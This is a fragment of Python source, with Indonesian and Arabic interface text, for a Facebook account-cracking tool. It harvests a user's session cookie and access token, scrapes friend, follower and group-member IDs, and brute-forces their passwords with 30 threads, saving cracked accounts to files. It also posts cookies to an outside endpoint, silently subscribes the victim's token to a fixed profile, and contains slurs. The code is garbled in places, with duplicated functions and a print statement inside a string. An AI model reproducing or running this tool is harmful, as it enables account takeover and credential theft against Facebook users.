            if user in["", " "]:
                print(f"\n{M}jangan kosong");time.sleep(2);self.menu()
            elif user.isdigit():
                memek = (f"{self.url}/profile.php?id={user}&v=followers")
            else:
                memek = (f"{self.url}/{user}?v=followers")
            try:
                link = self.ses.get(memek, cookies=cook).text
                if "Halaman Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                elif "Anda Diblokir Sementara" in link:
                    print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                elif "Konten Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                else:
                    print("[!] to stop press CTRL then press C on your keyboard.")
                    self.follow(memek, cook)
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit("[!] kesalahan pada koneksi")
            print()
            self.metode()
        elif ykh in ["4", "04"]:
            user = input(f"[{O}*{N}] enter id gruop : ")
            try:
                link = self.ses.get(f"{self.url}/groups/{user}", cookies=cook).text
                if "Halaman yang Anda minta tidak ditemukan." in link:
                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan");time.sleep(2);self.menu()
                elif "Anda Diblokir Sementara" in link:
                    print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                elif "Konten Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan");time.sleep(2);self.menu()
                else:
                    print("[!] to stop press CTRL then press C on your keyboard.")
                    self.dumps(f"{self.url}/groups/{user}", cook)
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit("[!] kesalahan pada koneksi")
            print()
            self.metode()
        elif ykh in ["5", "05"]:
            self.cek_hasil()
        elif ykh in ["6", "06"]:
            self.get_proxy()
        elif ykh in ["0", "00"]:
            self.hapus()
            exit("done remove cookie")
        else:print("[!] input yang bner kontol");time.sleep(2);self.menu()

    def cek_hasil(self):
        print("""-----------------------------------------------------
{01} check result ok
{02} check result cp
{00} back to menu
-----------------------------------------------------""")
        ykh = input(f"{H}[{M}+{H}]{N} HINI ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            try: yyy = open("ok.txt", "r").readlines()
            except FileNotFoundError:print("No ok results saved");time.sleep(2);self.cek_hasil()
            for i in yyy:
                print(i)
            exit("\nCheck result is complete")
        elif ykh in ["2", "02"]:
            try: yyy = open("cp.txt", "r").readlines()
            except FileNotFoundError:print("No cp results saved");time.sleep(2);self.cek_hasil()
            for i in yyy:
                print(i)
            exit("\nCheck result is complete")
        elif ykh in ["0", "00"]:
            self.menu()
        else:print("[!] input yang bnr");time.sleep(2);self.menu()

#-------------- DUMP ID -------------------
    def batur(self, link, coki):
        try:
            kontol = self.ses.get(link, cookies=coki).text
            memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    self.id.append(re.findall("id\=(.*?)\&", softek[0])[0]+"<=>"+softek[1])
                else:
                    self.id.append(re.findall("\/(.*?)\?eav",softek[0])[0]+"<=>"+softek[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Teman Lain" in kontol:
                self.batur(self.url+par(kontol, "html.parser").find("a", string="Lihat Teman Lain").get("href"), coki)
        except:pass

    def jnckk(self):
        linz = self.ses.get("https://pastebin.com/raw/mi4nGb0K").json()
        for i in linz["friends"]["data"]:
            self.kontol.update(i)

    def follow(self, link, coki):
        try:
            xxxx = self.ses.get(link, cookies=coki).text
            rege = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>', xxxx)
            for xxx in rege:
                if "profile.php?" in xxx[0]:
                    self.id.append(re.findall("id=(.*?)&amp;eav", xxx[0])[0]+"<=>"+xxx[1])
                else:
                    self.id.append(re.findall("(.*?)\?eav", xxx[0])[0]+"<=>"+xxx[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Selengkapnya" in xxxx:
                self.follow(self.url+par(xxxx, "html.parser").find("a", string="Lihat Selengkapnya").get("href"), coki)
        except:pass

    def dumps(self, link, coki):
        try:
            data = self.ses.get(link, cookies=coki).text
            cari = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>', data)
            for x in cari:
                if "profile.php?" in x[0]:
                    self.id.append(re.findall("id=(.*?)&amp;eav", x[0])[0]+"<=>"+x[1])
                else:
                    self.id.append(re.findall("(.*?)\?eav", x[0])[0]+"<=>"+x[1])
                sys.stdout.write(f"\r[+] sedang mengumpulkan {str(len(self.id))} id..");sys.stdout.flush()
            if "Lihat Postingan Lainnya" in data:
                self.dumps(self.url+par(data, "html.parser").find("a", string="Lihat Postingan Lainnya").get("href"), coki)
        except:pass

    def datas(self, nama, coki):
        try:
            data = {"title": nama, "message": coki}
            post = self.ses.post(self.cok, data=data).text
        except requests.ConnectionError:
            exit("\n[!] Tidak ada koneksi")
#--------------------------------------------
    def metode(self):
        print(f"[=] total ids: {str(len(self.id))}")
        print("""    [ select metode ]

  %s{%s01%s} Api
  %s{%s02%s} Async
  %s{%s03%s} validate
"""%(N,H,N,N,H,N,N,H,N))
        ykh = input(f"{H}[{M}+{H}]{N} HANI_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.paswww("api")
        elif ykh in ["2", "02"]:
            self.paswww("acy")
        elif ykh in ["3", "03"]:
            self.paswww("dat")
        else:print("[!] input yang bner kontol");time.sleep(2);self.metode()

    def paswww(self, xx):
        print("""    [ select password ]

  %s{%s01%s} manual
  %s{%s02%s} gabung
  %s{%s03%s} otomatis
"""%(N,H,N,N,H,N,N,H,N))
        ykh = input(f"{H}[{M}+{H}]{N} HANI_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.manual(xx)
        elif ykh in ["2", "02"]:
            print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
            kata = input(f"[{M}?{N}] sandi: ")
            xnxx = kata.split(",")
            for i in xnxx:
                self.pasw.append(i)
            print(f"kata sandi tambahan -> [ {M}{kata}{N} ]")
            self.carckk(xx)
        elif ykh in ["3", "03"]:
            self.carckk(xx)
        else:print("[!] input yang bner kontol");time.sleep(2);self.paswww()

    def manual(self, xx):
        self.iya.append("iya")
        print('kata sandi minimal 6 karakter, gunakan "," (koma) untuk kata sandi berikut nya\n')
        while True:
            global prog,des
            pwek = input(f"[{O}?{N}] sandi : ")
            if pwek in[""," "]:
                print(f"[{M}×{N}] jangan kosong bro kata sandi nya")
            elif len(pwek)<=5:
                print(f"[{M}×{N}] kata sandi minimal 6 karakter")
            else:
                if "api" in xx:
                    print("""---------------

------------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.apiiiiii, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
                elif "acy" in xx:
                    print("""--------------

---------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.regguler, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
                elif "dat" in xx:
                    print("""-------------

-----------------""")
                    prog = Progress(TextColumn('{task.description}'))
                    des = prog.add_task('', total=len(self.id))
                    with prog:
                        with Modol(max_workers=30) as bool:
                            for user in self.id:
                                bool.submit(self.apiiiiii, user.split("<=>")[0], pwek)
                        exit("\n\ncracking done!")
        
        os.system('clear')
        llogin()
def fak_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	llogin()

def banner():
	print(f'''⋘𝗭𝗔𝗜𝗠𝗘 ¦¦ 𝗣𝗬𝗧𝗛𝗢𝗡⋙''')

def llogin():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
			
			
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# Problem Internet Connection, Check And Try Again'
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t©©© Saran Ektensi : [green]Cookiedough[white] ©©©'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1));bot()
		cok=open(".cok.txt", "w").write(cookie)
		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass

def menu(my_name,my_id):
#------------------[ BAGIAN-MENU ]----------------#
from rich.console import Console
from rich.table import Table
def menu(my_name,my_id):
	try:
		cok = open('.cok.txt','r').read()
		token = open('.token.txt','r').read()
		
	except IOError:
		print('[×] Cookies expered ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	table=Table()
	print('''▁ ▂ ▃ ▅ ▆ ▇ █ ⓈⓅⒺⒹ █ ▇ ▆ ▅ ▃ ▂ ▁  1.4
-----------------------------------------------
                 ⟩ @V4V4J ⟨
                 ⟩ https://t.me/PHHH0HHHH ⟨
-----------------------------------------------
  print(""" [1;31m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⣾⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡆⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠇⠀⢠⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡇⠀⠈⣿⣧⠀⠀⠀⠀⠀⠀⠀⡀
⠀⠀⠀⠀⠀⠀⠀⢀⣿⡟⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣧⠀⠀⠘⣿⣇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣾⡿⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡀⠀⠀⠹⣿⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣸⣿⠃⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡇⠀⠀⠀⣿⣿⠀⠀⠀⠄⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡿⠀⠀⠀⠀⢻⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠸⣿⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣿⠇⠀⠀⠀⠀⢸⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣾⣿⠿⠿⠟⠛⠛⠿⠿⢿⣿⣶⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⡇⠀⠀⠀⠀⣿⣷⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⢸⣽⣿⡀⠀⠀⠀⠀⠀⣤⣶⣿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⢿⣿⣤⣀⠀⠀⠀⠀⠀⣼⣿⢹⠀⠀⠀⠀⠀⣿⣿⠠⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠈⠋⢿⣧⣀⠀⣠⣴⣿⢛⣭⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣬⣙⢿⣷⣄⠀⠀⣰⣿⠇⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀
⣇⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠈⠂⠀⠘⢿⣷⣴⣿⠛⠈⠉⠈⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠈⠉⠙⢿⣷⣴⣿⠋⠀⠀⠀⠀⠀⠀⠀⣾⣿⠀⠀⠀⠀⢠
⣿⡆⠀⠀⠀⢸⣿⡄⠀⠀⠀⠀⠡⠀⠀⠀⠙⠻⠿⣟⣻⣿⡆⠘⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⣿⣿⣛⠿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⢀⣾
⢸⣿⡄⠀⠀⠀⣿⣧⠀⠀⠀⠀⠀⢃⠀⠀⠀⠀⠀⠀⠀⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⠀⠀⠀⣼⣿
⢸⡟⢿⡆⠀⠀⢹⣿⡄⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⣼⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡀⠀⠀⠂⠀⣠⠞⠈⠁⠀⠀⠀⣾⡿⠂⠀⢀⣼⠇⣿
⢸⣷⡘⢿⣆⠀⠀⢿⣿⡀⢀⠀⠀⠀⠀⠘⠲⢤⣤⣴⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣷⣤⣤⠴⠛⠁⠀⠀⠀⠀⠀⣼⣿⠃⠀⢀⣼⠃⢸⡏
⠈⣿⣣⡀⠻⣧⡀⠀⢻⣷⣌⠳⣄⠀⠂⠀⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⡀⠀⠀⠀⠀⢀⡴⣿⣾⡿⠃⠀⣰⡿⠁⣰⢻⡇
⠀⢹⡏⢣⡀⠙⢿⣦⡀⠙⢿⣷⣾⣟⣳⣶⣶⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣶⣶⣖⣺⣭⣾⣿⠋⠀⢀⣾⠋⠀⣰⠃⣾⠁
⠀⢸⣷⠀⢻⣄⠀⠙⢿⣦⣾⡏⠉⠉⠙⠋⠉⠉⣠⠖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡈⠉⠉⠛⠉⠉⠹⣿⣇⣴⠟⠁⢀⣼⠁⢸⡏⠀
⠀⠀⣿⡦⠼⠟⢦⡀⠀⢹⣿⠁⠀⠀⠀⠲⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢦⠀⠀⠀⠀⠀⣠⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⠂⠀⠀⠀⢻⣿⠁⣀⣴⠋⠿⠄⣼⠇⠀
⠀⠀⢸⣧⠀⠀⢰⠛⢦⣼⣿⡀⠀⠀⠀⢀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⣰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠀⣼⣿⣴⠟⣷⠀⠀⢸⡟⠀⠀
⠀⠀⠈⣿⡄⠀⠈⡆⠀⠉⢿⣷⡆⠀⢰⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢆⠀⢀⣼⡿⠋⠀⠂⡟⠀⠀⣾⡇⠀⠀
⠀⠀⠀⠹⣷⣤⡀⠙⠀⠀⠀⢹⣷⣀⡈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡘⠀⠀⠀⠸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣠⢼⣿⠁⠀⠀⠐⠁⣠⣴⡿⠀⠀⠀
⠀⠀⠀⠀⠈⢿⣍⢦⡀⠀⠀⣸⡿⡏⠉⠳⢶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣶⠶⠊⠉⣾⣿⡄⠀⠀⣠⣞⣿⠟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢷⣆⠀⣠⣿⠇⠀⠁⠠⠀⠘⣏⣟⠿⢶⣦⣀⡀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⣀⣤⣴⠾⢿⡟⡟⠀⠀⠀⠀⠁⢻⣇⠀⣀⣶⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣾⡏⠀⠀⠀⠀⠀⠀⠙⠝⢶⣀⠈⠙⠻⢷⣦⣀⡀⢸⡇⠀⠀⠀⠀⣿⠀⣀⣤⡶⠿⠋⠉⢀⣴⠟⠞⠀⠀⠀⠀⠀⠀⢸⣿⣴⠿⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠂⠀⠀⠀⠀⠀⠙⣻⣶⣶⡿⠿⠛⠿⠾⣧⠀⠀⠀⠠⠿⠾⠟⠿⠿⣷⣶⣶⡛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣶⡀⢀⣀⠀⢀⣀⣠⣤⠤⠤⠒⠂⠀⠐⠛⣿⠀⠀⠀⠀⠀⢸⠛⠒⠀⠀⠒⠢⠤⢤⣤⣄⣀⠀⢀⡀⠀⣠⣾⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⠘⢿⣷⡀⠀⠛⣍⠻⣦⣄⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⣠⡾⣻⠟⠉⠀⣴⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠁⠀⢿⣷⡄⠀⠀⢳⠘⣿⣧⠀⠀⠀⠀⠀⢠⡟⠛⠀⠀⠀⠰⠹⣇⠀⠀⠒⠂⠀⣠⣾⠟⣰⠋⠀⢀⣼⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠘⣿⡿⡀⠀⠀⠳⠈⣯⢷⡄⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⣻⡆⠀⠀⠀⣴⣯⠟⠠⠃⠀⠀⣼⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠁⠀⠀⠀⢻⣧⠁⠀⠀⠀⠀⠸⣏⠻⣧⣄⠀⠘⢿⣄⠀⠀⠀⢀⣼⠟⠀⢀⣤⠞⢡⡟⠀⠀⠀⠀⠀⢻⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⢸⣿⣀⠀⠀⠀⠀⠀⢻⣄⠀⠹⠻⢦⣬⣿⣆⠀⢀⣾⣯⡴⠞⠛⠁⢀⣾⠃⠀⠀⠀⠀⢀⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣦⡀⠀⠀⠘⣿⢳⡀⣦⡀⠈⠉⣿⡄⣼⠏⡉⠀⣠⡆⣠⢿⡇⠀⠀⠀⣠⣾⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⠀⠀⢹⣇⠙⠫⢷⣤⠻⡹⣿⡏⡴⣿⡼⠻⠟⢡⡿⠁⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣷⠀⢨⢻⣆⠀⠀⠙⠀⢹⡿⡷⠁⠋⠀⠀⢀⣾⠃⡀⣰⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⢸⡌⠻⣿⣄⣀⡄⠀⠀⠀⠀⣄⣠⣶⠟⠁⣸⢡⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣌⠳⠦⠬⢍⣛⣛⣚⣓⣛⣚⣛⣩⠥⠤⠾⢃⣼⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣷⡄⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠹⣿⣆⠀⠀⠀⠀⠉⠈⠁⠀⠀⢠⣾⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⠀⠀⠀⠀⠀⠀⠀⢠⣿⡟⠀⠀⠀⠀⠀⠀⣤⡶⣤⠤⠤⠤⠤⠤⡤⠤⡄⠀⢀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣷⣤⣤⣤⣤⣤⣶⣿⠟⠀⠀⠀⠀⠀⠀⠀⢛⠃⡛⠺⠦⠦⠴⠦⠴⠦⠴⠦⠭⠤⠤⠦⠄⠀⢀⠀""")
SPED MAX TOP 1 🥱🔥
-----------------------------------------------''')
	table.add_column("NO",width=11,justify="center",style="red")
	table.add_column("😈سبيد ملك ساحه",justify="center",width=43,style= "red")
	table.add_column("مًدٍفُـوٌعٌهّـ ",justify="center",width=11,style="red")
	#table.add_row("01","صيد من ايدي واحد","ONLINE")
	table.add_row("02","صيد ايديات هواي","ONLINE")
	table.add_row("03","صيد من ملف","ONLINE")
	#table.add_row("04","فحص الصيد","ONLINE")
	#table.add_row("05", "CONTECT ME", "ONLINE")
	#table.add_row("06", "GRUP TELEGRAM • Code", "ONLINE")
	table.add_row("00", "تطلع من كوكيز ", "ONLINE")
	Consol=Console()
	cetak(nel(table,width=79,title=f"[bold green]MENU",style="bold hot_pink2"))

	RAF_MKZ=wa.input(f"  [bold red] ╰─ [bold white]PILIH : [bold green]") 
	if  RAF_MKZ in ['1','01']:
		raf_dump()
	elif RAF_MKZ in ['2','02']:
		dump_massal()
	elif RAF_MKZ in ['3','03']:
		File2()
	elif RAF_MKZ in ['4','04']:
		result()
	elif RAF_MKZ in ['5','05']:


		#elif Meledak in ['4']:


		#siu()


	#elif Meledak in ['0']:


		os.system('rm -rf .token.txt')


		os.system('rm -rf .cok.txt')


		print(' Successfully Logout+Delete Cookies√ ')


		exit()


	else:


		print(' input correctly ')


		back()


def siu():


	start()


	get_data_web()


	akhir()


def error():


	print(f' Sorry, this feature is still being fixed {x}')


	time.sleep(4)


	back()


def ganti_tema():


		print(""" Maaf Tools Ini Sedang Di Perbaiki """)


		sleep(2) 


		back()


def dump_publik():


	try:


		token = open('.token.txt','r').read()


		kukis = open('.cok.txt','r').read()


	except IOError:


		exit()


	print('')


	pil = input('ID : ')


	try:


	       head = (
	       {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	except (KeyError,IOError):
	      pass
	except requests.exceptions.ConnectionError:
	        exit()


def follower():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('[>>] CRACK ID LIMIT : اكتب عدد الايديات '))
	except ValueError:
		print('{k}[✖] NOT PUBLIC ID ')
		time.sleep(3)
		follower()
	if jum<1:
